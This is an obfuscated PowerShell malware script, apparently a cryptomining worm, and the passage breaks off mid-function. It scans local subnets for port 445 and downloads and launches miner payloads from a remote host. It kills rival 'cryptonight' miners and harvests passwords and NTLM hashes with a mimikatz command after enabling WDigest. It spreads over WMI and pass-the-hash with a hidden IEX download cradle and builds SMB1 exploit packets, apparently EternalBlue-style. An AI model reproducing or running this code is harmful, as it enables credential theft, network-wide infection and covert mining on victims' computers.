function ConvertTo-DecimalIP ([Net.IPAddress]$IPAddress){
    $i = 3; $DecimalIP = 0;
    $IPAddress.GetAddressBytes() | FOreAc`H-`objECT { $DecimalIP += $_ * [Math]::Pow(256, $i); $i-- }
    return [UInt32]$DecimalIP
}

function ConvertTo-DottedDecimalIP ([String]$IPAddress){
        $IPAddress = [UInt32]$IPAddress
        $DottedIP = $( For ($i = 3; $i -gt -1; $i--) {
          $Remainder = $IPAddress % [Math]::Pow(256, $i)
          ($IPAddress - $Remainder) / [Math]::Pow(256, $i)
          $IPAddress = $Remainder
         } )
        return [String]::Join('.', $DottedIP)
}

function Get-NetworkRange( [String]$IP, [String]$Mask ) {
  $DecimalIP = cOn`V`Er`Tto-DECI`maLIp $IP
  $DecimalMask = COnvE`RTT`O-deC`I`malip $Mask

  $Network = $DecimalIP -band $DecimalMask
  $Broadcast = $DecimalIP -bor ((-bnot $DecimalMask) -band [UInt32]::MaxValue)

  for ($i = $($Network + 1); $i -lt $Broadcast; $i++) {
    Con`VERTT`O`-Dotted`dEci`mALip $i
  }
  #Static WLAN 1
  if (!($IP.contains("192.168.0.")))
  {
      # 192.168.0.*
      $DecimalIP = cOn`V`Er`Tto-DECI`maLIp "192.168.0.1"
      $DecimalMask = COnvE`RTT`O-deC`I`malip $Mask
      $Network = $DecimalIP -band $DecimalMask
      $Broadcast = $DecimalIP -bor ((-bnot $DecimalMask) -band [UInt32]::MaxValue)
      for ($i = $($Network + 1); $i -lt $Broadcast; $i++) {
        Con`VERTT`O`-Dotted`dEci`mALip $i
      }
  }
  #Static WLAN 2
  if (!($IP.contains("192.168.1.")))
  {
      # 192.168.1.*
      $DecimalIP = cOn`V`Er`Tto-DECI`maLIp "192.168.1.1"
      $DecimalMask = COnvE`RTT`O-deC`I`malip $Mask
      $Network = $DecimalIP -band $DecimalMask
      $Broadcast = $DecimalIP -bor ((-bnot $DecimalMask) -band [UInt32]::MaxValue)
      for ($i = $($Network + 1); $i -lt $Broadcast; $i++) {
        Con`VERTT`O`-Dotted`dEci`mALip $i
      }
  }
  #Static WLAN 3
  if (!($IP.contains("192.168.153.")))
  {
      # 192.168.153.*
      $DecimalIP = cOn`V`Er`Tto-DECI`maLIp "192.168.153.1"
      $DecimalMask = COnvE`RTT`O-deC`I`malip $Mask
      $Network = $DecimalIP -band $DecimalMask
      $Broadcast = $DecimalIP -bor ((-bnot $DecimalMask) -band [UInt32]::MaxValue)
      for ($i = $($Network + 1); $i -lt $Broadcast; $i++) {
        Con`VERTT`O`-Dotted`dEci`mALip $i
      }
  }
  #Static WLAN 4
  if (!($IP.contains("10.0.0.")))
  {
      # 10.0.0.*
      $DecimalIP = cOn`V`Er`Tto-DECI`maLIp "10.0.0.1"
      $DecimalMask = COnvE`RTT`O-deC`I`malip $Mask
      $Network = $DecimalIP -band $DecimalMask
      $Broadcast = $DecimalIP -bor ((-bnot $DecimalMask) -band [UInt32]::MaxValue)
      for ($i = $($Network + 1); $i -lt $Broadcast; $i++) {
        Con`VERTT`O`-Dotted`dEci`mALip $i
      }
  }
}

function Test-Port($IP)
{
    try
    {
        $tcpclient = New-Object -TypeName system.Net.Sockets.TcpClient
        $iar = $tcpclient.BeginConnect($IP,445,$null,$null)
        $wait = $iar.AsyncWaitHandle.WaitOne(100,$false)
        if(!$wait)
        {
            $tcpclient.Close()
            return $false
        }
        else
        {
            $null = $tcpclient.EndConnect($iar)
            $tcpclient.Close()
            return $true
        }
    }
    catch
    {
        return $false
    }
}

function Get-IpInBs( [String]$ipbody, [String]$ipbottom ){
  return $ipbody+$ipbottom
}

function Get-IpInB([String]$IPAddress){
  $iphead+=$IPAddress.Split(".")[0]+"."+$IPAddress.Split(".")[1]+"."
  For ($i = 0; $i -le 254; ++$i)
  {
    $ipbody=$iphead+$i+"."
    For ($j = 1; $j -le 254; ++$j)
    {
      Get-IpInBs $ipbody $j
    }
  }
}

function Download_File
{
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Filename
    )
    $webclient = ne`W-`object System.Net.WebClient
    $webclient.Headers.Add(('U'+'se'+'r-Ag'+'ent'),('Mozi'+'l'+'la/4.'+'0+'))
    $webclient.Proxy = [System.Net.WebRequest]::DefaultWebProxy
    $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    $ProxyAuth = $webclient.Proxy.IsBypassed($URL)
    if($ProxyAuth)
    {
        [string]$hexformat = $webClient.DownloadString($URL)
    }
    else
    {
        $webClient = N`eW-`object -ComObject InternetExplorer.Application
        $webClient.Visible = $false
        $webClient.Navigate($URL)
        while($webClient.ReadyState -ne 4) { STaRT`-`slE`ep -Milliseconds 100 }
        [string]$hexformat = $webClient.Document.Body.innerText
        $webClient.Quit()
    }
    [Byte[]] $temp = $hexformat -split ' '
    [System.IO.File]::WriteAllBytes("$env:temp\$Filename", $temp)
}

function RunDDOS([String]$FileName)
{
    if ((teSt-`Pa`TH ($env:temp+"\$FileName"))){
        $proc=$False
        [array]$p=gET`-wmiOB`JE`cT -Class Win32_Process | SeLE`cT Name
        foreach($process in $p){
            $name = ([string]($process.Name)).ToLower()
            if(($name -ne $null) -and ($name -ne "")){
                if($name.contains(($FileName)) -eq $true){
                    Ec`Ho ('r'+'un'+'ing')
                    $proc=$True
                }
            }
        }
        if ($proc -ne $true)
        {
          Sta`RT`-PROCeSS -NoNewWindow "$env:temp\$FileName"
        }
    }else{
      DoWN`l`Oa`D_FiLE "http://$nic/cohernece.txt" "$FileName"
      sTART-pro`C`Ess -NoNewWindow "$env:temp\$FileName"
    }
}

function RunSYS([String]$FileName)
{
    if ((teSt-`Pa`TH ($env:temp+"\$FileName"))){
        $proc=$False
        [array]$p=gET`-wmiOB`JE`cT -Class Win32_Process | SeLE`cT Name
        foreach($process in $p){
            $name = ([string]($process.Name)).ToLower()
            if(($name -ne $null) -and ($name -ne "")){
                if($name.contains(($FileName)) -eq $true){
                    Ec`Ho ('r'+'un'+'ing')
                    $proc=$True
                }
            }
        }
        if ($proc -ne $true)
        {
          echo "yes"
        }
    }else{
      DoWN`l`Oa`D_FiLE "http://$nic/sys.txt" "$FileName"

      
    }
}
function RunNSSM([String]$FileName)
{
    if ((teSt-`Pa`TH ($env:temp+"\$FileName"))){
        $proc=$False
        [array]$p=gET`-wmiOB`JE`cT -Class Win32_Process | SeLE`cT Name
        foreach($process in $p){
            $name = ([string]($process.Name)).ToLower()
            if(($name -ne $null) -and ($name -ne "")){
                if($name.contains(($FileName)) -eq $true){
                    Ec`Ho ('r'+'un'+'ing')
                    $proc=$True
                }
            }
        }
        if ($proc -ne $true)
        {
          echo "yes"
        }
    }else{
      DoWN`l`Oa`D_FiLE "http://$nic/nssm.txt" "$FileName"

      
    }
}

function RunMON([String]$FileName)
{
    if ((teSt-`Pa`TH ($env:temp+"\$FileName"))){
        $proc=$False
        [array]$p=gET`-wmiOB`JE`cT -Class Win32_Process | SeLE`cT Name
        foreach($process in $p){
            $name = ([string]($process.Name)).ToLower()
            if(($name -ne $null) -and ($name -ne "")){
                if($name.contains(($FileName)) -eq $true){
                    Ec`Ho ('r'+'un'+'ing')
                    $proc=$True
                }
            }
        }
        if ($proc -ne $true)
        {
          Sta`RT`-PROCeSS -NoNewWindow "$env:temp\$FileName" "-pSwifck"
        }
    }else{
      DoWN`l`Oa`D_FiLE "http://$nic/mon.txt" "$FileName"
      sTART-pro`C`Ess -NoNewWindow "$env:temp\$FileName" "-pSwifck"
    }
}

function RunMIN([String]$FileName)
{
    if ((teSt-`Pa`TH ($env:temp+"\$FileName"))){
        $proc=$False
        [array]$p=gET`-wmiOB`JE`cT -Class Win32_Process | SeLE`cT Name
        foreach($process in $p){
            $name = ([string]($process.Name)).ToLower()
            if(($name -ne $null) -and ($name -ne "")){
                if($name.contains(($FileName)) -eq $true){
                    Ec`Ho ('r'+'un'+'ing')
                    $proc=$True
                }
            }
        }
        if ($proc -ne $true)
        {
          Sta`RT`-PROCeSS -NoNewWindow "$env:temp\$FileName" "-pSwifck"
        }
    }else{
      DoWN`l`Oa`D_FiLE "http://$nic/min.txt" "$FileName"
      sTART-pro`C`Ess -NoNewWindow "$env:temp\$FileName" "-pSwifck"
    }
}
function RunACCESS([String]$FileName)
{
    if ((teSt-`Pa`TH ($env:temp+"\$FileName"))){
        $proc=$False
        [array]$p=gET`-wmiOB`JE`cT -Class Win32_Process | SeLE`cT Name
        foreach($process in $p){
            $name = ([string]($process.Name)).ToLower()
            if(($name -ne $null) -and ($name -ne "")){
                if($name.contains(($FileName)) -eq $true){
                    Ec`Ho ('r'+'un'+'ing')
                    $proc=$True
                }
            }
        }
        if ($proc -ne $true)
        {
          echo "yes"
        }
    }else{
      DoWN`l`Oa`D_FiLE "http://$nic/access.txt" "$FileName"
    }
}
function RunXMR([String]$FileName)
{
    if ((teSt-`Pa`TH ($env:temp+"\$FileName"))){
        $proc=$False
        [array]$p=gET`-wmiOB`JE`cT -Class Win32_Process | SeLE`cT Name
        foreach($process in $p){
            $name = ([string]($process.Name)).ToLower()
            if(($name -ne $null) -and ($name -ne "")){
                if($name.contains(($FileName)) -eq $true){
                    Ec`Ho ('r'+'un'+'ing')
                    $proc=$True
                }
            }
        }
        if ($proc -ne $true)
        {
          Sta`RT`-PROCeSS -NoNewWindow "$env:temp\$FileName" "-pSwifck"
        }
    }else{
      DoWN`l`Oa`D_FiLE "http://$nic/steam.txt" "$FileName"
      sTART-pro`C`Ess -NoNewWindow "$env:temp\$FileName" "-pSwifck"
    }
}
function RunUAS([String]$FileName)
{
    if ((teSt-`Pa`TH ($env:temp+"\$FileName"))){
        $proc=$False
        [array]$p=gET`-wmiOB`JE`cT -Class Win32_Process | SeLE`cT Name
        foreach($process in $p){
            $name = ([string]($process.Name)).ToLower()
            if(($name -ne $null) -and ($name -ne "")){
                if($name.contains(($FileName)) -eq $true){
                    Ec`Ho ('r'+'un'+'ing')
                    $proc=$True
                }
            }
        }
        if ($proc -ne $true)
        {
          Sta`RT`-PROCeSS -NoNewWindow "$env:temp\$FileName" "-pSwifcks"
        }
    }else{
      DoWN`l`Oa`D_FiLE "http://$nic/uas.txt" "$FileName"
      sTART-pro`C`Ess -NoNewWindow "$env:temp\$FileName" "-pSwifcks"
    }
}

function KillBot ([String]$WmiClassName){
    [array]$p=Get-wmiobject -Class Win32_Process | select Name,ProcessId,CommandLine,Path
    if(($p -ne $null) -and ($p -ne "")){
        foreach($process in $p){
            $id = $process.ProcessId
            $command = ([string]($process.CommandLine)).ToLower()
            $path = ([string]($process.Path)).ToLower()
            # cmdline
            if(($command -ne $null) -and ($command -ne "")){
                if($command.contains(('wmiclass')) -eq $true){
                    if($command.contains($WmiClassName.ToLower()) -ne $true){
                        stop-process -Id $id -Force
                    }
                }
                if($command.contains(('cryptonight')) -eq $true){
                    $ParentProcessId = (get-wmiobject -Class Win32_Process -Filter "ProcessId=$id").ParentProcessId
                    if(($id -ne $null) -and ($id -ne "")){
                        stop-process -Id $id -Force
                    }
                    if(($ParentProcessId -ne $null) -and ($ParentProcessId -ne "")){
                        stop-process -Id $ParentProcessId -Force
                    }
                }
            }
            # file_string
            if(($path -ne $null) -and ($path -ne "")){
                if ((Get-Item $path).length -gt 2mb){
                    $tmpContent=findstr /i /m /c:"cryptonight" "$path"
                }else{
                    $tmpContent=Get-Content -path $path | Select-String -pattern "cryptonight"
                }
                if(($tmpContent -ne $null) -and ($tmpContent -ne "")){
                    $ParentProcessId = (get-wmiobject -Class Win32_Process -Filter "ProcessId=$id").ParentProcessId
                    if(($id -ne $null) -and ($id -ne "")){
                        stop-process -Id $id -Force
                    }
                    if(($ParentProcessId -ne $null) -and ($ParentProcessId -ne "")){
                        stop-process -Id $ParentProcessId -Force
                    }
                }
            }
        }
    }
    return 1
}

function Get-creds($PEBytes64, $PEBytes32){
	$cc=INVok`E-cOmM`And -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, ('Voi'+'d'), 0, "", ('sek'+'ur'+'lsa::logonpa'+'ss'+'w'+'ords exit'))
    $cs=$cc.Split("`n")
    $a=@()
	$NTLM=$False
    for ($i=0;$i -le $cs.Count-1; $i+=1)
    {
        if ($cs[$i].contains(('Us'+'e'+'rname')) -and $cs[$i+1].contains(('Domai'+'n')) -and $cs[$i+2].contains(('Passwor'+'d')))
        {
            $h= $cs[$i].split(":")[-1].trim()+' '+$cs[$i+1].split(":")[-1].trim()+' '+$cs[$i+2].split(":")[-1].trim()
            if ($h.split(' ')[-1] -ne ('(NUL'+'L)') -and $h.split(' ')[0][-1] -ne "`$" -and  $a -notcontains $h){
                $a+=$h
            }
        }
    }
    if ($a.count -eq 0)
    {
        $NTLM=$True
        $t=g`et-IT`EMPrOP`eRTY -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential
        if ($t -eq $null)
        { NeW-Item`pRO`P`e`RTy -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1 | oUT-`N`Ull}
        elseif ($t.UseLogonCredential -eq 0){
        SEt-ITe`M`PR`oPE`Rty  -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
        }

        $a=@()
        for ($i=0;$i -le $cs.Count-1; $i+=1)
        {
            if ($cs[$i].contains(('U'+'ser'+'name')) -and $cs[$i+1].contains(('D'+'omai'+'n')) -and $cs[$i+2].contains('LM'))
            {
                if (!$cs[$i+2].contains(('NT'+'LM')) -and $cs[$i+3].contains(('NT'+'LM')) ){$nm=$cs[$i+3].split(":")[-1].trim()}
                else{$nm=$cs[$i+2].split(":")[-1].trim()}
                $h= $cs[$i].split(":")[-1].trim()+' '+$cs[$i+1].split(":")[-1].trim()+' '+$nm
                if ($h.split(' ')[-1] -ne ('('+'NULL)') -and $h.split(' ')[0][-1] -ne "`$" -and  $a -notcontains $h){
                    $a+=$h
                }
            }
        }
      }
    return $a, $NTLM
}

function test-ip
{
    param
    (
        [Parameter(Mandatory = $False)]
        [string]$ip,
        [Parameter(Mandatory = $False)]
        [array]$creds,
        [Parameter(Mandatory = $False)]
        [string]$nic,
		[Parameter(Mandatory = $False)]
        [int]$ntlm
    )
     Process
    {

        foreach ($c in $creds)
        {
            $User=$c.split(" ")[0]
            $domain=$c.split(" ")[1]
            $passwd=$c.split(" ")[2]
            $password = CoNverTT`O-`SeCuRE`s`Tr`ING $passwd -asplaintext -force
            $cmd ="cmd /c powershell.exe -NoP -NonI -W Hidden `"if((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('64')){IEX(New-Object Net.WebClient).DownloadString('http://$nic/networks.ps1')}else{IEX(New-Object Net.WebClient).DownloadString('http://$nic/netstat.ps1')}`""

            if (!$ntlm)
            {
				$cred = n`Ew-obj`ECT -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
                $ps=[string](g`ET-`wmIOBJEcT -Namespace root\Subscription -Class __FilterToConsumerBinding -Credential $cred -computername $IP )
                if($ps -ne $null -and $ps.contains(('Wind'+'ows Ev'+'e'+'nts '+'Filte'+'r')))
                {  return 1 }
                if($ps -ne $null -and !$ps.contains(('Win'+'dows Even'+'ts'+' Fi'+'lt'+'er')))
                {

                    $re=IN`VO`Ke-w`MImEtHOd -class win32_process -name create -Argumentlist $cmd -Credential $cred -Computername $IP
                    if ($re -ne $null -and $re.returnvalue -eq 0 )
                    {return 1}
                }

                $username=$domain+"\"+$user
                $cred = N`E`W-o`BJECt -Typename System.Management.Automation.PSCredential -argumentlist $username,$password
                $ps=[string](g`Et`-`Wm`iOBJect -Namespace root\Subscription -Class __FilterToConsumerBinding -Credential $cred -computername $IP )
                if($ps -ne $null -and $ps.contains(('Windo'+'ws Event'+'s'+' Fi'+'lter')))
                {  return 1 }
                if($ps -ne $null -and !$ps.contains(('Wi'+'ndow'+'s Ev'+'ents'+' '+'Filter')))
                {
                    $re=I`N`VOke-wmIm`e`ThOD -class win32_process -name create -Argumentlist $cmd -Credential $cred -Computername $IP
                    if ($re -ne $null -and $re.returnvalue -eq 0 )
                    {return 1}
                }
                if ($user -ne ('admi'+'nistra'+'tor'))
                {
                    $cred = ne`w-ObJE`ct -Typename System.Management.Automation.PSCredential -argumentlist ('a'+'dm'+'inistr'+'ato'+'r'),$password
                    $ps=[string](G`Et`-Wm`I`ObJEcT -Namespace root\Subscription -Class __FilterToConsumerBinding -Credential $cred -computername $IP )
                    if($ps -ne $null -and $ps.contains(('W'+'indows Ev'+'ents'+' Fi'+'lter')))
                    {  return 1 }
                    if($ps -ne $null -and !$ps.contains(('Window'+'s Ev'+'en'+'ts F'+'ilt'+'er')))
                    {
                        $re=i`NvoKe`-`Wm`imEThOd -class win32_process -name create -Argumentlist $cmd -Credential $cred -Computername $IP
                        if ($re -ne $null -and $re.returnvalue -eq 0 )
                        {return 1}
                    }
                }
            }
            else
            {
                $ntlmhash=$passwd
				$cmdntlm =$cmd
				$re=in`VO`Ke-`wmie`XEc -Target $ip -Username $user -Hash $ntlmhash
                if ($re.contains(('access'+'e'+'d'+' WMI')))
                {
                    $re=iNvoKe`-W`MiE`XEC -Target $ip -Username $user -Hash $ntlmhash -command $cmdntlm
                    if ($re -ne $null -and $re.contains(('C'+'ommand e'+'xecu'+'te'+'d w'+'ith p'+'rocess')))
                    {return 1}
                }

                $re=iNVOKe`-`wm`iex`Ec -Target $ip -domain $domain -Username $user -Hash $ntlmhash
                if ($re.contains(('accessed W'+'M'+'I')))
                {
                    $re=IN`V`O`kE-WMiEXEC -Target $ip -domain $domain -Username $user -Hash $ntlmhash -command $cmdntlm
                    if ($re -ne $null -and $re.contains(('Command'+' executed wi'+'th '+'pr'+'oc'+'es'+'s')))
                    {return 1}
                }
                if ($user -ne ('ad'+'mi'+'nist'+'rator'))
                {
                    $re=InV`oke-wm`iE`Xec -Target $ip -Username ('a'+'dministrat'+'or') -Hash $ntlmhash
                    if ($re.contains(('acce'+'s'+'se'+'d WMI')))
                    {
                        $re=iN`VoKE-w`M`IEXeC -Target $ip -Username ('ad'+'mini'+'s'+'trator') -Hash $ntlmhash -command $cmdntlm
                        if ($re -ne $null -and $re.contains(('C'+'o'+'m'+'ma'+'nd executed with p'+'roce'+'ss')))
                        {return 1}
                    }
                }
            }
        } #foreach
        return 0
      }
}

function sentfile($filepath,$wmipath)
{
        $EncodedFile = ([WmiClass] (('roo'+'t'+'{'+'0'+'}d'+'efault:System_An'+'ti_Virus_Core') -f[CHAR]92)).Properties[$wmipath].Value
        $Bytes2=[system.convert]::FromBase64String($EncodedFile)
        [IO.File]::WriteAllBytes($filepath,$Bytes2)
}



function make_smb1_anonymous_login_packet {
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x00,0x48
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x73
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xff,0xff
$pkt += 0x2f,0x4b
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x0d
$pkt += 0xff
$pkt += 0x00
$pkt += 0x00,0x00
$pkt += 0x00,0xf0
$pkt += 0x02,0x00
$pkt += 0x2f,0x4b
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x41,0xc0,0x00,0x00
$pkt += 0x0b,0x00
$pkt += 0x00,0x00
$pkt += 0x6e,0x74,0x00
$pkt += 0x70,0x79,0x73,0x6d,0x62,0x00
return $pkt
}
function smb1_anonymous_login($sock){
$raw_proto = MaK`E_sM`B1_anONy`mOUs`_logIN_`p`ACk`ET
$sock.Send($raw_proto) | out`-Nu`Ll
return SmB1_`G`eT`_ReSp`ONse($sock)
}
function negotiate_proto_request()
{
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x00,0x2f
$pkt += 0xFF,0x53,0x4D,0x42
$pkt += 0x72
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xff,0xff
$pkt += 0x2F,0x4B
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00
$pkt += 0x0c,0x00
$pkt += 0x02
$pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00
return $pkt
}
function smb_header($smbheader) {
$parsed_header =@{server_component=$smbheader[0..3];
smb_command=$smbheader[4];
error_class=$smbheader[5];
reserved1=$smbheader[6];
error_code=$smbheader[6..7];
flags=$smbheader[8];
flags2=$smbheader[9..10];
process_id_high=$smbheader[11..12];
signature=$smbheader[13..21];
reserved2=$smbheader[22..23];
tree_id=$smbheader[24..25];
process_id=$smbheader[26..27];
user_id=$smbheader[28..29];
multiplex_id=$smbheader[30..31];
}
return $parsed_header
}
function smb1_get_response($sock){
$tcp_response = [Array]::CreateInstance(('by'+'te'), 1024)
try{
$sock.Receive($tcp_response)| oU`T-nu`Ll
}
catch {
}
$netbios = $tcp_response[0..4]
$smb_header = $tcp_response[4..36]
$parsed_header = SM`B_He`Ader($smb_header)
return $tcp_response, $parsed_header
}
function client_negotiate($sock){
$raw_proto = NE`Goti`A`Te_PrOto_r`EqueSt
$sock.Send($raw_proto) | out`-nUll
return SMb`1_ge`T`_rE`spoNsE($sock)
}
function tree_connect_andx($sock, $target, $userid){
$raw_proto = tre`E`_conn`Ec`T_`ANdx_req`UesT $target $userid
$sock.Send($raw_proto) | oUT-nu`Ll
return Smb1_`gE`T_`REs`p`ONSE($sock)
}
function tree_connect_andx_request($target, $userid) {
[Byte[]] $pkt = [Byte[]](0x00)
$pkt +=0x00,0x00,0x48
$pkt +=0xFF,0x53,0x4D,0x42
$pkt +=0x75
$pkt +=0x00,0x00,0x00,0x00
$pkt +=0x18
$pkt +=0x01,0x48
$pkt +=0x00,0x00
$pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
$pkt +=0x00,0x00
$pkt +=0xff,0xff
$pkt +=0x2F,0x4B
$pkt += $userid
$pkt +=0x00,0x00
$ipc = (('{0}{'+'0'+'}')-F[cHAr]92)+ $target + "\IPC$"
$pkt +=0x04
$pkt +=0xFF
$pkt +=0x00
$pkt +=0x00,0x00
$pkt +=0x00,0x00
$pkt +=0x01,0x00
$al=[system.Text.Encoding]::ASCII.GetBytes($ipc).Count+8
$pkt+=[bitconverter]::GetBytes($al)[0],0x00
$pkt +=0x00
$pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc)
$pkt += 0x00
$pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00
$len = $pkt.Length - 4
$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
$pkt[1] = $hexlen[0]
$pkt[2] = $hexlen[1]
$pkt[3] = $hexlen[2]
return $pkt
}
function smb1_anonymous_connect_ipc($target)
{
$client = n`eW-Ob`ject System.Net.Sockets.TcpClient($target,445)
$sock = $client.Client
cLIen`T_NEGotiA`TE($sock) | O`UT`-NulL
$raw, $smbheader = S`Mb`1_an`On`ymouS_login $sock
$raw, $smbheader = tREe`_cO`N`NEC`T_aN`dx $sock $target $smbheader.user_id
return $smbheader, $sock
}
function make_smb1_nt_trans_packet($tree_id, $user_id) {
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x08,0x3C
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0xa0
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += $tree_id
$pkt += 0x2f,0x4b
$pkt += $user_id
$pkt += 0x00,0x00
$pkt += 0x14
$pkt += 0x01
$pkt += 0x00,0x00
$pkt += 0x1e,0x00,0x00,0x00
$pkt += 0x16,0x00,0x01,0x00
$pkt += 0x1e,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x1e,0x00,0x00,0x00
$pkt += 0x4c,0x00,0x00,0x00
$pkt += 0xd0,0x07,0x00,0x00
$pkt += 0x6c,0x00,0x00,0x00
$pkt += 0x01
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xf1,0x07
$pkt += 0xff
$pkt += [Byte[]] (0x00) * 0x1e
$pkt += 0xff,0xff,0x00,0x00,0x01
$pkt += [Byte[]](0x00) * 0x7CD
return $pkt
}
function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) {
$timeout = ($timeout * 0x10) + 7
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x10,0x38
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x33
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += $tree_id
$pkt += 0x2f,0x4b
$pkt += $user_id
$pkt += 0x00,0x00
$pkt += 0x09
$pkt += 0x00,0x00
$pkt += 0x00,0x10
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00
$pkt += 0x00
$pkt += 0x00,0x10
$pkt += 0x38,0x00,0xd0
$pkt += [bitconverter]::GetBytes($timeout)[0]
$pkt += 0x00,0x00
$pkt += 0x03,0x10
$pkt += 0xff,0xff,0xff
$pkt +=$data
$len = $pkt.Length - 4
$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
$pkt[1] = $hexlen[0]
$pkt[2] = $hexlen[1]
$pkt[3] = $hexlen[2]
return $pkt
}
function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) {
$timeout = ($timeout * 0x10) + 7
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x08,0x7e
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x33
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += $tree_id
$pkt += 0x2f,0x4b
$pkt += $user_id
$pkt += 0x00,0x00
$pkt += 0x09
$pkt += 0x00,0x00
$pkt += 0x46,0x08
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00
$pkt += 0x00
$pkt += 0x46,0x08
$pkt += 0x38,0x00,0xd0
$pkt += [bitconverter]::GetBytes($timeout)[0]
$pkt += 0x00,0x00
$pkt += 0x49,0x08
$pkt += 0xff,0xff,0xff
$pkt +=$data
$len = $pkt.Length - 4
$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
$pkt[1] = $hexlen[0]
$pkt[2] = $hexlen[1]
$pkt[3] = $hexlen[2]
return $pkt
}
function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk){
$nt_trans_pkt = Ma`K`e_Smb1_n`T_`TrAns_PA`C`KET $smbheader.tree_id $smbheader.user_id
$sock.Send($nt_trans_pkt) | Ou`T-`Null
$raw, $transheader = smB1`_GET_r`Es`P`O`NsE($sock)
$i=$firstDataFragmentSize
$timeout=0
while ($i -lt $data.count)
{
$sendSize=[System.Math]::Min(4096,($data.count-$i))
if (($data.count-$i) -le 4096){
if (!$sendLastChunk)
{ break }
}
$trans2_pkt = m`AKE_s`Mb1_`T`RAns`2_eXPlOIt_P`ACkEt $smbheader.tree_id $smbheader.user_id $data[$i..($i+$sendSize-1)] $timeout
$sock.Send($trans2_pkt) | Ou`T-`NUll
$timeout+=1
$i +=$sendSize
}
if ($sendLastChunk)
{SM`B1_g`et`_REspO`N`sE($sock) }
return $i,$timeout
}
function createSessionAllocNonPaged($target, $size) {
$client = NEw`-`objeCt System.Net.Sockets.TcpClient($target,445)
$sock = $client.Client
CLIEn`T`_NeGO`T`iaTe($sock) | OU`T-Nu`Ll
$flags2=16385
if ($size -ge 0xffff)
{ $reqsize=$size /2}
else
{
$flags2 =49153
$reqsize= $size
}
if($flags2 -eq 49153) {
$pkt = ma`K`e_`SmB`1_FREe_ho`LE_SesSioN`_P`ACKet (0x01,0xc0) (0x02,0x00) (0xf0,0xff,0x00,0x00,0x00)
}
else {
$pkt = mAke_smb1_fREE_Ho`LE`_SESS`I`ON`_`PaCKEt (0x01,0x40) (0x02,0x00) (0xf8,0x87,0x00,0x00,0x00)
}
$sock.Send($pkt) | oUt`-NU`ll
S`m`B`1_Ge`T_R`ESpoNSE($sock) | ou`T-n`ULL
return $sock
}
function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) {
[Byte[]] $pkt = 0x00
$pkt += 0x00,0x00,0x51
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x73
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += $flags2
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xff,0xff
$pkt += 0x2f,0x4b
$pkt += 0x00,0x00
$pkt += 0x40,0x00
$pkt += 0x0c
$pkt += 0xff
$pkt += 0x00
$pkt += 0x00,0x00
$pkt += 0x00,0xf0
$pkt += 0x02,0x00
$pkt += $vcnum
